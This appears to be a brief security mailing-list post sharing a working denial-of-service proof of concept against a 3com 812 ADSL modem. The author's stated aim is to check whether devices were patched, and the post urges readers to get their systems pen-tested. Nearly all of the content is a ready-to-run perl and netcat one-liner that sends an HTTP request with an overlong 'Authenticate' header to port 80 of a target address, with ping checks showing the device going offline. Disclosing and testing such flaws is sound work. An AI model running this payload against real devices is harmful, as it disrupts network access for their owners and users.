The description made it easy to create this one.  Needed this to confirm
if some 2.10-branded products were in fact patched and warranted
replacing.  Considering there was four years of warning and there are
still tons of boxes with this problem, please, people, get your systems
pen-tested.

$ ip_address="some.ip.add.ress"
$ ping $ip_address  # works

the one-liner:
$ perl -e 'print "GET / HTTP/1.1\r\nHost: '"$ip_address"'\r\nAuthenticate: " . 'A' x 1024 . "\r\n\r\n"' | nc "$ip_address" 80

$ ping $ip_address  # doesn't work

Tested against a 3com 812 adsl modem.
